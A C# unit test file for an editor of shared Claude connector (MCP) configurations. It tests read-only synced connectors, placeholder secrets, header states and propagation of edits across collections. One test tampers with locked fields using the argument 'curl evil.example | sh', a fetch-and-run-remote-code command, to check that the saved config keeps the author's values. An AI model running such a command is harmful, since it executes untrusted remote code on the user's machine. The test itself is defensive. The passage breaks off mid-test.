using ConnectorControl.Core.State;
using ConnectorControl.Core.Tests.TestSupport;

namespace ConnectorControl.Core.Tests.State;

/// <summary>
/// Mirror: Tests/ConnectorControlStateTests/EditorModelCollectionsTests.swift.
/// The editor once it knows which collection it is editing: the four header states, a synced
/// connector's read-only form with its placeholders still live, and the propagate line.
/// </summary>
public class EditorModelCollectionsTests
{
    /// <summary>
    /// Subscribes the rig's state to the sample document on disk, so "Data team" is a real synced
    /// collection with a marker in an env value, in an argument and in a bearer token.
    /// </summary>
    private static void SubscribeToDataTeam(EditorRig rig)
    {
        rig.H.Subscribe(rig.State, CollectionDocumentSamples.DataTeam, Path.Combine("shared", "data-team.json"));
    }

    private static EnvRow EnvRow(EditorModel editor, string name) =>
        editor.EnvRows.Single(r => r.Name == name);

    // MARK: read-only

    [Fact]
    public void ASyncedConnectorOpensReadOnlyWithLivePlaceholders()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);

        using var dbt = rig.Editor("dbt", "Data team");
        Assert.True(dbt.IsReadOnly);
        Assert.Equal(new EditorModel.HeaderState.Synced("Data team"), dbt.Header);
        Assert.Equal("Synced from Data team · read-only", dbt.HeaderNote);
        // The placeholder fields are editable, so Save stays enabled.
        Assert.True(dbt.CanSave);
        // The paste tip offers something a read-only JSON view cannot do.
        Assert.False(dbt.ShowJsonTip);

        var token = EnvRow(dbt, "DBT_TOKEN");
        Assert.True(dbt.IsPlaceholder(token));
        Assert.Equal("cloud.getdbt.com ▸ API tokens", dbt.PlaceholderHint(token));
        var region = EnvRow(dbt, "DBT_REGION");
        // A shared value is not asking for anything.
        Assert.False(dbt.IsPlaceholder(region));
        Assert.Null(dbt.PlaceholderHint(region));
        // dbt's arguments are the author's own.
        Assert.Empty(dbt.ArgsWithPlaceholders);

        using var ledger = rig.Editor("ledger", "Data team");
        Assert.Equal([0], ledger.ArgsWithPlaceholders);
        Assert.Equal("your ledger clone, then dist/index.js", ledger.PlaceholderHintForArg(0));
        // An index past the end has nothing to say.
        Assert.Null(ledger.PlaceholderHintForArg(7));

        using var notion = rig.Editor("notion", "Data team");
        Assert.True(notion.BearerTokenIsPlaceholder);
        Assert.Equal("notion.so ▸ integrations", notion.BearerTokenHint);
        Assert.False(notion.HeaderValueIsPlaceholder);
        Assert.False(notion.ClientSecretIsPlaceholder);

        // A filled field stops asking, the moment it is filled.
        notion.BearerToken = "secret_abc";
        Assert.False(notion.BearerTokenIsPlaceholder);
        Assert.Null(notion.BearerTokenHint);
    }

    [Fact]
    public void ALocalConnectorIsNeitherReadOnlyNorPlaceholdered()
    {
        using var rig = new EditorRig();

        using var editor = rig.Editor("scoutbook", "Default");
        Assert.False(editor.IsReadOnly);
        Assert.Equal(new EditorModel.HeaderState.None(), editor.Header);
        Assert.Null(editor.HeaderNote);
        Assert.True(editor.ShowJsonTip);
        Assert.False(editor.BearerTokenIsPlaceholder);
        Assert.Empty(editor.ArgsWithPlaceholders);
    }

    /// <summary>
    /// The author's update lands under an open read-only editor. Save reports the conflict and
    /// writes nothing: no Save Anyway, whose detail would be untrue here, and no write-back of the
    /// config the window opened on. The value typed in the stale editor is not carried over;
    /// reopening the editor shows the author's current config.
    /// </summary>
    [Fact]
    public void AReadOnlySaveAfterTheAuthorsChangeIsRefused()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;
        using var editor = rig.Editor("dbt", "Data team");
        var opened = state.Store.Collections["Data team"].Mcps["dbt"];
        var changed = opened.Config.Replacing(new JsonPointer(["env", "DBT_REGION"]), JsonValue.String("ap"))!;
        Assert.Null(state.Upsert("dbt", new McpEntry(opened.Enabled, changed), "dbt", "Data team"));
        EnvRow(editor, "DBT_TOKEN").Value = "dbt_pat_123";

        Assert.False(editor.Save());
        Assert.Equal(EditorModel.ChangedOutsideMessage("dbt"), editor.ValidationError);
        // No Save Anyway: its detail would be untrue here.
        Assert.Empty(rig.H.Dialogs.Confirms);
        // The author's change stands, and nothing typed in the stale editor lands.
        Assert.Equal(changed, state.Store.Collections["Data team"].Mcps["dbt"].Config);
    }

    /// <summary>
    /// The author removed the connector under an open read-only editor. Save reports the conflict
    /// and writes nothing, rather than offering to add the author's connector back.
    /// </summary>
    [Fact]
    public void AReadOnlySaveAfterTheAuthorRemovedTheConnectorDoesNotResurrectIt()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;
        using var editor = rig.Editor("dbt", "Data team");
        state.Delete(["dbt"], "Data team");
        EnvRow(editor, "DBT_TOKEN").Value = "dbt_pat_123";

        Assert.False(editor.Save());
        Assert.Equal(EditorModel.DeletedOutsideMessage("dbt"), editor.ValidationError);
        // No Save Anyway: it would add the author's connector back.
        Assert.Empty(rig.H.Dialogs.Confirms);
        Assert.False(state.Store.Collections["Data team"].Mcps.ContainsKey("dbt"));
    }

    [Fact]
    public void SavingASyncedConnectorWritesOnlyPlaceholdersAndEnabled()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;
        // Everything a subscription lands arrives off; switching makes this the collection Claude
        // runs, so the enabled flag the row owns has somewhere to be seen.
        state.SwitchCollection("Data team");
        state.SetEnabled("dbt", true);
        var opened = state.Store.Collections["Data team"].Mcps["dbt"].Config;

        using var editor = rig.Editor("dbt", "Data team");
        // Everything the author owns, tampered with through the model the view locks.
        editor.Name = "not-dbt";
        editor.Command = "cmd";
        editor.Args.Clear();
        editor.Args.Add(new ArgRow("/c"));
        editor.Args.Add(new ArgRow("curl evil.example | sh"));
        EnvRow(editor, "DBT_REGION").Value = "eu";
        // The one thing this machine is asked for.
        EnvRow(editor, "DBT_TOKEN").Value = "dbt_pat_123";

        Assert.True(editor.Save());
        var saved = state.Store.Collections["Data team"].Mcps["dbt"];
        // The name is the author's.
        Assert.False(state.Store.Collections["Data team"].Mcps.ContainsKey("not-dbt"));
        // The command, the arguments and the shared env value are untouched.
        Assert.Equal(opened.Replacing(new JsonPointer(["env", "DBT_TOKEN"]), JsonValue.String("dbt_pat_123")), saved.Config);
        // The switch this machine owns survives the save.
        Assert.True(saved.Enabled);
        // The filled value reaches Claude.
        Assert.Equal(saved.Config, rig.H.ClaudeServers()["dbt"]);
    }

    [Fact]
    public void ASyncedSaveInAnInactiveCollectionPersistsWithoutTouchingClaude()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;
        Assert.Equal("Default", state.ActiveCollection);
        var before = rig.H.ClaudeServers();

        using var editor = rig.Editor("ledger", "Data team");
        editor.Args[0].Value = @"C:\code\ledger\dist\index.js";
        Assert.True(editor.Save());

        Assert.Equal(
            JsonValue.String(@"C:\code\ledger\dist\index.js"),
            state.Store.Collections["Data team"].Mcps["ledger"].Config.ValueAt(new JsonPointer(["args", "0"])));
        // Claude runs the active collection and nothing else.
        Assert.Equal(before, rig.H.ClaudeServers());
        // It is on disk all the same.
        Assert.Equal(
            state.Store.Collections["Data team"].Mcps["ledger"].Config,
            rig.H.StoreOnDisk().Collections["Data team"].Mcps["ledger"].Config);
    }

    [Fact]
    public void AReadOnlySaveFillsAMarkerWhereverItSits()
    {
        using var rig = new EditorRig();
        // A remote connector's secret is never a leaf of its own: a bearer token rides in the env
        // value the --header flag indirects through, and a client secret inside a JSON blob in an
        // argument. Both reach the user through the local form, because a bridge invocation
        // carrying auth flags is not the canonical two-argument shape the remote form detects.
        var sample = CollectionDocumentSamples.DataTeam;
        var connectors = new Dictionary<string, CollectionDocument.Connector>(sample.Connectors, StringComparer.Ordinal)
        {
            ["billing"] = new(
                new CollectionDocument.Launcher.Remote(
                    "https://mcp.billing.example/", new CollectionDocument.Auth.OAuthClient("cc-app", "read"), "mcp-remote", []),
                new Dictionary<string, CollectionDocument.EnvValue>(),
                new Dictionary<string, string?> { ["client_secret"] = "the billing console" },
                new Dictionary<string, JsonValue>()),
        };
        var state = rig.State;
        rig.H.Subscribe(state, new CollectionDocument(sample.Name, sample.Author, sample.Origin, sample.Exported, connectors),
            Path.Combine("shared", "data-team.json"));

        using var notion = rig.Editor("notion", "Data team");
        // The --header flags take it out of the remote form.
        Assert.False(notion.IsRemote);
        // The decoded token is a marker all the same.
        Assert.True(notion.BearerTokenIsPlaceholder);
        Assert.Equal("notion.so ▸ integrations", notion.BearerTokenHint);
        var openedNotion = state.Store.Collections["Data team"].Mcps["notion"].Config;
        var header = EnvRow(notion, "AUTH_HEADER");
        Assert.True(notion.IsPlaceholder(header));
        header.Value = "Bearer secret_abc";
        notion.Command = "cmd";
        Assert.True(notion.Save());
        var savedNotion = state.Store.Collections["Data team"].Mcps["notion"].Config;
        Assert.Equal(JsonValue.String("Bearer secret_abc"), savedNotion.ValueAt(new JsonPointer(["env", "AUTH_HEADER"])));
        AssertOnlyMarkedLeavesMoved(openedNotion, savedNotion);

        using var billing = rig.Editor("billing", "Data team");
        Assert.True(billing.ClientSecretIsPlaceholder);
        Assert.Equal("the billing console", billing.ClientSecretHint);
        var openedBilling = state.Store.Collections["Data team"].Mcps["billing"].Config;
        var blob = Assert.Single(billing.ArgsWithPlaceholders);
        Assert.Equal("the billing console", billing.PlaceholderHintForArg(blob));
        billing.Args[blob].Value = """{"client_id":"cc-app","client_secret":"shh"}""";
        Assert.True(billing.Save());
        var savedBilling = state.Store.Collections["Data team"].Mcps["billing"].Config;
        Assert.Equal(JsonValue.String("""{"client_id":"cc-app","client_secret":"shh"}"""),
                     savedBilling.ValueAt(new JsonPointer(["args", blob.ToString(System.Globalization.CultureInfo.InvariantCulture)])));
        AssertOnlyMarkedLeavesMoved(openedBilling, savedBilling);
    }

    /// <summary>
    /// Every string in the config as it opened that was not a marker is still exactly where and
    /// what the author left it.
    /// </summary>
    private static void AssertOnlyMarkedLeavesMoved(JsonValue opened, JsonValue saved)
    {
        foreach (var leaf in opened.StringLeaves())
        {
            if (!Placeholder.ContainsMarker(leaf.Value))
            {
                Assert.Equal(JsonValue.String(leaf.Value), saved.ValueAt(leaf.Pointer));
            }
        }
    }

    // MARK: header states

    [Fact]
    public void HeaderStatesFollowTheCollection()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;

        using (var plain = rig.Editor("scoutbook", "Default"))
        {
            Assert.Equal(new EditorModel.HeaderState.None(), plain.Header);
        }
        using (var synced = rig.Editor("dbt", "Data team"))
        {
            Assert.Equal(new EditorModel.HeaderState.Synced("Data team"), synced.Header);
        }

        Assert.Null(state.MakeLocalCopy(["dbt"], "Data team", "Default"));
        var date = state.CollectionsFile.Collections["Default"].Provenance["dbt"].Date;
        using (var imported = rig.Editor("dbt", "Default"))
        {
            Assert.Equal(new EditorModel.HeaderState.Imported("Data team", date), imported.Header);
            Assert.Equal($"Imported from “Data team” on {date}. Edits stay here.", imported.HeaderNote);
            // A copy is the user's own.
            Assert.False(imported.IsReadOnly);
        }

        Assert.Null(state.CreateCollection("Team"));
        var folder = Path.GetDirectoryName(rig.H.Publish(state, "Team", folder: "share"))!;
        using var published = rig.Editor("scoutbook", "Team");
        Assert.Equal(new EditorModel.HeaderState.Published(folder), published.Header);
        Assert.Equal($"Published to {folder} — saving updates the file your team reads. Secrets stay here.",
                     published.HeaderNote);
        Assert.False(published.IsReadOnly);
    }

    // MARK: propagate

    /// <summary>More than one twin takes the plural verb.</summary>
    [Fact]
    public void ThePropagateLabelAgreesWithHowManyTwinsThereAre()
    {
        using var rig = new EditorRig();
        rig.Twin("Backup");
        rig.Twin("Spare");
        using var editor = rig.Editor("scoutbook", "Default");
        Assert.Equal("Also apply this change to Backup, Spare, which have an identical scoutbook", editor.PropagateMessage);
    }

    [Fact]
    public void PropagateAppliesTheChangeToIdenticalTwins()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        rig.Twin("Backup");
        state.SetEnabled("scoutbook", false, "Backup");

        using var editor = rig.Editor("scoutbook", "Default");
        Assert.Equal(["Backup"], editor.PropagateTargets);
        Assert.True(editor.ShowPropagate);
        // Off unless the user ticks it.
        Assert.False(editor.Propagate);
        Assert.Equal("Also apply this change to Backup, which has an identical scoutbook", editor.PropagateMessage);

        editor.Propagate = true;
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        Assert.True(editor.Save());

        var updated = state.Store.Collections["Default"].Mcps["scoutbook"];
        Assert.Contains("/mcp/v2", updated.Config.EditorText(), StringComparison.Ordinal);
        Assert.Equal(updated.Config, state.Store.Collections["Backup"].Mcps["scoutbook"].Config);
        // The twin's own on/off state is not part of the change.
        Assert.False(state.Store.Collections["Backup"].Mcps["scoutbook"].Enabled);
        Assert.True(updated.Enabled);
    }

    [Fact]
    public void AnUntickedPropagateLeavesTheTwinAlone()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        rig.Twin("Backup");
        var twin = state.Store.Collections["Backup"].Mcps["scoutbook"].Config;

        using var editor = rig.Editor("scoutbook", "Default");
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        Assert.True(editor.Save());

        Assert.Equal(twin, state.Store.Collections["Backup"].Mcps["scoutbook"].Config);
    }

    [Fact]
    public void PropagateSkipsATwinThatMovedWhileTheWindowWasOpen()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        rig.Twin("Backup");

        using var editor = rig.Editor("scoutbook", "Default");
        Assert.Equal(["Backup"], editor.PropagateTargets);
        // A second window on the twin saved first — the checkbox's promise no longer holds for it.
        var moved = new McpEntry(AppStateHarness.Remote("https://scoutbook.example.com/mcp/other"));
        Assert.Null(state.Upsert("scoutbook", moved, "scoutbook", "Backup"));

        editor.Propagate = true;
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        Assert.True(editor.Save());

        // A twin that is no longer identical keeps what it says.
        Assert.Equal(moved.Config, state.Store.Collections["Backup"].Mcps["scoutbook"].Config);
        // The save itself still lands.
        Assert.Contains("/mcp/v2", state.Store.Collections["Default"].Mcps["scoutbook"].Config.EditorText(),
                        StringComparison.Ordinal);
    }

    [Fact]
    public void PropagatingIntoTheActiveCollectionReachesClaudeOnce()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        // Edit the inactive side and propagate inward: the twin Claude runs is the one that moves.
        rig.Twin("Spare");
        var appliedBefore = rig.H.Settings.LastApplyDate;

        using var editor = rig.Editor("scoutbook", "Spare");
        Assert.Equal(["Default"], editor.PropagateTargets);
        editor.Propagate = true;
        editor.RemoteUrl = "https://scoutbook.example.com/mcp/v2";
        rig.H.Now = rig.H.Now.AddMinutes(1);
        Assert.True(editor.Save());

        var updated = state.Store.Collections["Default"].Mcps["scoutbook"].Config;
        Assert.Contains("/mcp/v2", updated.EditorText(), StringComparison.Ordinal);
        // Claude follows the active collection.
        Assert.Equal(updated, rig.H.ClaudeServers()["scoutbook"]);
        // The save applied.
        Assert.NotEqual(appliedBefore, rig.H.Settings.LastApplyDate);
        Assert.Equal(rig.H.Now, rig.H.Settings.LastApplyDate);
        // One apply, and it came after every write: an apply that ran before the propagated
        // collection was written would leave the store dirty behind it.
        Assert.False(state.IsDirty);
        Assert.Equal(updated, state.Store.Collections["Spare"].Mcps["scoutbook"].Config);
    }

    [Fact]
    public void PropagateCarriesARenameToTheTwin()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        rig.Twin("Backup");

        using var editor = rig.Editor("scoutbook", "Default");
        editor.Propagate = true;
        editor.Name = "scouts";
        Assert.True(editor.Save());

        Assert.False(state.Store.Collections["Backup"].Mcps.ContainsKey("scoutbook"));
        Assert.True(state.Store.Collections["Backup"].Mcps.ContainsKey("scouts"));
        Assert.False(state.Store.Collections["Default"].Mcps.ContainsKey("scoutbook"));
        Assert.True(state.Store.Collections["Default"].Mcps.ContainsKey("scouts"));
    }

    [Fact]
    public void PropagateLeavesACollectionWhoseNewNameIsTakenAlone()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        rig.Twin("Backup");
        // "Backup" already has something called "scouts", so the rename cannot land there.
        var occupant = new McpEntry(AppStateHarness.Remote("https://scouts.example/mcp"));
        Assert.Null(state.Upsert("scouts", occupant, null, "Backup"));

        using var editor = rig.Editor("scoutbook", "Default");
        editor.Propagate = true;
        editor.Name = "scouts";
        // The save the user asked for still lands.
        Assert.True(editor.Save());

        // The name was taken, so that collection is left as it was.
        Assert.Equal(occupant.Config, state.Store.Collections["Backup"].Mcps["scouts"].Config);
        Assert.True(state.Store.Collections["Backup"].Mcps.ContainsKey("scoutbook"));
        Assert.True(state.Store.Collections["Default"].Mcps.ContainsKey("scouts"));
    }

    [Fact]
    public void PropagateIsOfferedOnlyForIdenticalLocalTwins()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        var state = rig.State;

        // A twin whose config has moved on is not the same connector any more.
        Assert.Null(state.CreateCollection("Other"));
        state.SwitchCollection("Default");
        Assert.Null(state.Upsert("scoutbook", new McpEntry(AppStateHarness.Remote("https://elsewhere.example/mcp")),
                                 "scoutbook", "Other"));
        using (var editor = rig.Editor("scoutbook", "Default"))
        {
            Assert.Empty(editor.PropagateTargets);
            Assert.False(editor.ShowPropagate);
        }

        // A synced collection holding the very same connector is never a propagate target, in
        // either direction: its copy belongs to its author.
        Assert.Null(state.MakeLocalCopy(["notion"], "Data team", "Default"));
        using (var local = rig.Editor("notion", "Default"))
        {
            Assert.Empty(local.PropagateTargets);
        }
        using (var synced = rig.Editor("notion", "Data team"))
        {
            Assert.Empty(synced.PropagateTargets);
        }

        // A connector that does not exist yet has no twins.
        using var fresh = rig.Editor(TestTargets.New(rig.Local("node", ["x.js"])));
        Assert.Empty(fresh.PropagateTargets);
    }

    // MARK: targets

    [Fact]
    public void ATargetNamesItsCollectionAndOpensItsOwnWindow()
    {
        var entry = new McpEntry(AppStateHarness.Remote("https://x.example/mcp"));
        var active = EditTarget.Existing("x", entry, "Default");
        var team = EditTarget.Existing("x", entry, "Team");
        Assert.Equal("Default", active.Collection);
        Assert.Equal("Team", team.Collection);
        // The collection is part of the identity, the active one's too.
        Assert.Equal("Default\u001Fx", active.Id);
        Assert.NotEqual(team.Id, active.Id);
        Assert.NotEqual(team, active);
        Assert.Equal("Team", EditTarget.NewRemote(RemoteLaunchStyle.CmdNpx, "Team").Collection);

        // The same connector in the same collection is the same window, however its entry has
        // changed since: a click on its row brings the open editor forward.
        var again = EditTarget.Existing("x", entry with { Enabled = false }, "Default");
        Assert.Equal(active, again);
        Assert.Equal(active.GetHashCode(), again.GetHashCode());
        Assert.NotEqual(EditTarget.NewRemote(RemoteLaunchStyle.CmdNpx, "Team"), EditTarget.NewRemote(RemoteLaunchStyle.CmdNpx, "Team"));
    }
    /// <summary>
    /// The Mac has no mirror of this: there the secret fields and the JSON error are
    /// <c>@Published</c>, so a change to one republishes the whole object. Here they are plain
    /// properties, and what a synced editor unlocks is read off their text, so the text and the
    /// two things derived from it have to be announced together. Without these raises the editor
    /// window has to work the answers out for itself.
    /// </summary>
    [Fact]
    public void FillingASecretFieldRaisesWhatIsReadOffIt()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        using var notion = rig.Editor("notion", "Data team");
        var raised = new List<string>();
        notion.PropertyChanged += (_, e) => raised.Add(e.PropertyName ?? "");

        Assert.True(notion.BearerTokenIsPlaceholder);
        notion.BearerToken = "secret_abc";
        Assert.Contains(nameof(EditorModel.BearerTokenIsPlaceholder), raised);
        Assert.Contains(nameof(EditorModel.BearerTokenHint), raised);
        Assert.False(notion.BearerTokenIsPlaceholder);
        Assert.Null(notion.BearerTokenHint);

        // Typing the same text again says nothing.
        raised.Clear();
        notion.BearerToken = "secret_abc";
        Assert.Empty(raised);

        // The other two secrets answer the same way.
        raised.Clear();
        notion.HeaderValue = Placeholder.Marker("header_value");
        Assert.Contains(nameof(EditorModel.HeaderValueIsPlaceholder), raised);
        Assert.Contains(nameof(EditorModel.HeaderValueHint), raised);
        Assert.True(notion.HeaderValueIsPlaceholder);

        raised.Clear();
        notion.OAuthClientSecret = Placeholder.Marker("client_secret");
        Assert.Contains(nameof(EditorModel.ClientSecretIsPlaceholder), raised);
        Assert.Contains(nameof(EditorModel.ClientSecretHint), raised);
        Assert.True(notion.ClientSecretIsPlaceholder);
    }

    /// <summary>
    /// C#-only: <c>jsonError</c> is @Published on the Mac, so the tip re-reads without anything
    /// raising for it.
    /// </summary>
    [Fact]
    public void TheJsonTipFollowsTheJsonError()
    {
        using var rig = new EditorRig();
        using var editor = rig.Editor(TestTargets.New(rig.Local("node", ["x.js"])));
        Assert.True(editor.ShowJsonTip);
        var raised = new List<string>();
        editor.PropertyChanged += (_, e) => raised.Add(e.PropertyName ?? "");

        editor.View = EditView.Json;
        editor.JsonText = "{not json";
        Assert.NotNull(editor.JsonError);
        Assert.False(editor.ShowJsonTip);
        Assert.Contains(nameof(EditorModel.ShowJsonTip), raised);

        raised.Clear();
        editor.JsonText = "{}";
        Assert.Null(editor.JsonError);
        Assert.True(editor.ShowJsonTip);
        Assert.Contains(nameof(EditorModel.ShowJsonTip), raised);
    }
    // MARK: the open-time snapshot

    [Fact]
    public void WhatAFieldWasAskingForIsFixedWhenTheWindowOpens()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);

        using var dbt = rig.Editor("dbt", "Data team");
        var token = EnvRow(dbt, "DBT_TOKEN");
        Assert.True(dbt.AsksFor(token));
        Assert.True(dbt.IsPlaceholder(token));
        // Filling it answers the question; it does not hand the field back to the lock.
        token.Value = "secret_abc";
        Assert.False(dbt.IsPlaceholder(token));
        Assert.True(dbt.AsksFor(token), "the field being typed into stays the live one");
        // A row that was not asking never becomes live, whatever is typed into it.
        Assert.False(dbt.AsksFor(EnvRow(dbt, "DBT_REGION")));

        using var ledger = rig.Editor("ledger", "Data team");
        Assert.Equal([0], ledger.ArgsWithPlaceholders);
        Assert.True(ledger.AsksForArg(0));
        ledger.Args[0].Value = "/Users/d/ledger/dist/index.js";
        Assert.Empty(ledger.ArgsWithPlaceholders);
        Assert.True(ledger.AsksForArg(0));
        // An index past the end asks for nothing.
        Assert.False(ledger.AsksForArg(7));
        // Keyed by the row, not the position: a row inserted above carries the answer with it.
        ledger.Args.Insert(0, new ArgRow("--quiet"));
        Assert.False(ledger.AsksForArg(0));
        Assert.True(ledger.AsksForArg(1));

        using var notion = rig.Editor("notion", "Data team");
        Assert.True(notion.AsksForBearerToken);
        notion.BearerToken = "secret_abc";
        // The ring and the hint follow the text; the lock does not.
        Assert.False(notion.BearerTokenIsPlaceholder);
        Assert.True(notion.AsksForBearerToken);
        Assert.False(notion.AsksForHeaderValue);
        Assert.False(notion.AsksForClientSecret);
    }

    /// <summary>
    /// Owed: asked for when the window opened, and either still the author's marker or emptied
    /// since. What the caution ring and the phrase under a field follow.
    /// </summary>
    [Fact]
    public void AValueIsOwedWhileItsMarkerStandsAndAgainOnceEmptied()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);

        using var dbt = rig.Editor("dbt", "Data team");
        var token = EnvRow(dbt, "DBT_TOKEN");
        Assert.True(dbt.IsOwed(token));
        token.Value = "secret_abc";
        Assert.False(dbt.IsOwed(token));
        token.Value = "";
        Assert.True(dbt.IsOwed(token));   // emptied, it owes again
        var region = EnvRow(dbt, "DBT_REGION");
        region.Value = "";
        Assert.False(dbt.IsOwed(region));   // a field that never asked owes nothing, empty or not

        using var ledger = rig.Editor("ledger", "Data team");
        Assert.True(ledger.IsOwedArg(0));
        ledger.Args[0].Value = "/Users/d/ledger/dist/index.js";
        Assert.False(ledger.IsOwedArg(0));
        ledger.Args[0].Value = "";
        Assert.True(ledger.IsOwedArg(0));
        Assert.False(ledger.IsOwedArg(7));   // an index past the end owes nothing

        using var notion = rig.Editor("notion", "Data team");
        Assert.True(notion.BearerTokenOwed);
        notion.BearerToken = "secret_abc";
        Assert.False(notion.BearerTokenOwed);
        notion.BearerToken = "";
        Assert.True(notion.BearerTokenOwed);
        notion.HeaderValue = "";
        Assert.False(notion.HeaderValueOwed);
        notion.OAuthClientSecret = "";
        Assert.False(notion.ClientSecretOwed);
    }

    // MARK: published hints

    [Fact]
    public void APublishedConnectorCarriesTheAuthorsHintForEachStrippedValue()
    {
        using var rig = new EditorRig();
        var state = rig.State;
        Assert.Null(state.CreateCollection("Team"));
        Assert.Null(state.Upsert("svc", new McpEntry(JsonValue.Object(
            ("command", JsonValue.String("node")),
            ("args", JsonValue.Array([JsonValue.String("/Users/d/server.js")])),
            ("env", JsonValue.Object(("TOKEN", JsonValue.String("sk-live")), ("REGION", JsonValue.String("us")))))),
            null, "Team"));
        var pointer = new JsonPointer(["args", "0"]);
        var intent = new PublishIntent(
            [new("svc", new HashSet<string>(["REGION"], StringComparer.Ordinal))],
            [new("svc", new Dictionary<JsonPointer, PublishIntent.PathMark>
            {
                [pointer] = new("server_path", "your clone, then dist/index.js", "/Users/d/server.js"),
            })],
            [new("svc", new Dictionary<string, string>(StringComparer.Ordinal)
            {
                ["TOKEN"] = "acme.example ▸ API tokens",
            })]);
        rig.H.Publish(state, "Team", intent, "share");

        using var editor = rig.Editor("svc", "Team");
        Assert.True(editor.HasPublishedHints);
        var token = EnvRow(editor, "TOKEN");
        Assert.Equal("acme.example ▸ API tokens", editor.PublishedHint(token));
        // A shared value is not stripped, so the author owes no explanation for it.
        Assert.Null(editor.PublishedHint(EnvRow(editor, "REGION")));
        Assert.Equal("your clone, then dist/index.js", editor.PublishedHintForArg(0));
        Assert.Null(editor.PublishedHintForArg(7));

        // A published collection's editor adds and deletes arguments freely, and the record
        // keys the hint by where the marker sat, so the answer follows the row rather than the
        // position it happens to hold now.
        editor.Args.Insert(0, new ArgRow("--quiet"));
        Assert.Null(editor.PublishedHintForArg(0));   // a row added since the window opened
        Assert.Equal("your clone, then dist/index.js", editor.PublishedHintForArg(1));
        editor.Args.RemoveAt(0);
        Assert.Equal("your clone, then dist/index.js", editor.PublishedHintForArg(0));
        // A different question from the synced sidecar's needs, which say nothing here.
        Assert.Null(editor.PlaceholderHint(token));

        // A local collection nobody publishes has none of this to say.
        using var plain = rig.Editor("scoutbook", "Default");
        Assert.False(plain.HasPublishedHints);
        Assert.Null(plain.PublishedHintForArg(0));

        // The record without this machine's binding is another machine's publish, and the hints
        // are that machine's business, not this editor's.
        new CollectionsLocalCache([], []).Save(state.Service.Paths.CollectionsCachePath);
        state.Reload();
        using var elsewhere = rig.Editor("svc", "Team");
        Assert.True(state.IsPublished("Team"), "the sidecar still carries the record");
        Assert.False(elsewhere.HasPublishedHints);
        Assert.Null(elsewhere.PublishedHint(EnvRow(elsewhere, "TOKEN")));
        Assert.Null(elsewhere.PublishedHintForArg(0));
    }

    /// <summary>
    /// C#-only: SwiftUI switches on the HeaderState enum itself, so the Mac needs no bools to
    /// tell the four states apart.
    /// </summary>
    [Fact]
    public void EachHeaderStateSaysWhichOneItIs()
    {
        Assert.True(new EditorModel.HeaderState.Synced("Team").IsSynced);
        Assert.True(new EditorModel.HeaderState.Published("/share").IsPublished);
        Assert.True(new EditorModel.HeaderState.Imported("Team", "2026-09-21").IsImported);
        var none = new EditorModel.HeaderState.None();
        Assert.False(none.IsSynced);
        Assert.False(none.IsPublished);
        Assert.False(none.IsImported);
        // Exactly one at a time, so a view can bind three visibilities and get one header.
        var synced = new EditorModel.HeaderState.Synced("Team");
        Assert.False(synced.IsPublished);
        Assert.False(synced.IsImported);
    }

    /// <summary>
    /// C#-only: the Mac's model republishes as a whole on any AppState change, so there is no
    /// per-property raise to assert.
    /// </summary>
    [Fact]
    public void TheCollectionsOwnAnswersFollowAppStateWithoutReseatingTheView()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        using var dbt = rig.Editor("dbt", "Data team");
        Assert.True(dbt.IsReadOnly);
        var raised = new List<string>();
        dbt.PropertyChanged += (_, e) => raised.Add(e.PropertyName ?? "");

        // Detaching the collection unlocks the form; the window used to re-seat its DataContext
        // to notice, which regenerated every row and took the caret with it.
        rig.State.StopSyncing("Data team");
        Assert.False(dbt.IsReadOnly);
        Assert.Contains(nameof(EditorModel.IsReadOnly), raised);
        Assert.Contains(nameof(EditorModel.Header), raised);
        Assert.Contains(nameof(EditorModel.HeaderNote), raised);
        Assert.Contains(nameof(EditorModel.HasHeaderNote), raised);
        Assert.Contains(nameof(EditorModel.ShowJsonTip), raised);
        Assert.Contains(nameof(EditorModel.HasPublishedHints), raised);
    }
    [Fact]
    public void StopSyncingRetakesTheSnapshotSoAFilledSecretIsMaskedAgain()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);
        using var notion = rig.Editor("notion", "Data team");
        Assert.True(notion.IsReadOnly);
        Assert.True(notion.AsksForBearerToken);
        var raised = new List<string>();
        notion.PropertyChanged += (_, e) => raised.Add(e.PropertyName ?? "");

        // Filled while the form still locks everything else: the field stays the live one, so
        // the user can keep typing into it.
        notion.BearerToken = "secret_abc";
        Assert.True(notion.AsksForBearerToken);

        // Stop Syncing turns the whole form into an ordinary editable one. What the user filled
        // is now an ordinary secret and must stop being rendered in the clear.
        rig.State.StopSyncing("Data team");
        Assert.False(notion.IsReadOnly);
        Assert.False(notion.AsksForBearerToken);
        Assert.Contains(nameof(EditorModel.AsksForBearerToken), raised);

        // A field still holding its marker is still owed, locked form or not.
        using var dbt = rig.Editor("dbt", "Data team");
        var token = EnvRow(dbt, "DBT_TOKEN");
        Assert.False(dbt.IsReadOnly);   // the collection is local now
        Assert.True(dbt.AsksFor(token));
        Assert.True(dbt.IsPlaceholder(token));
    }
    // MARK: a JSON round trip keeps both records

    [Fact]
    public void AJsonRoundTripKeepsWhatASyncedFormAskedFor()
    {
        using var rig = new EditorRig();
        SubscribeToDataTeam(rig);

        // The round trip rebuilds every row; the record has to recognise the rebuilt ones.
        using var dbt = rig.Editor("dbt", "Data team");
        dbt.RequestView(EditView.Json);
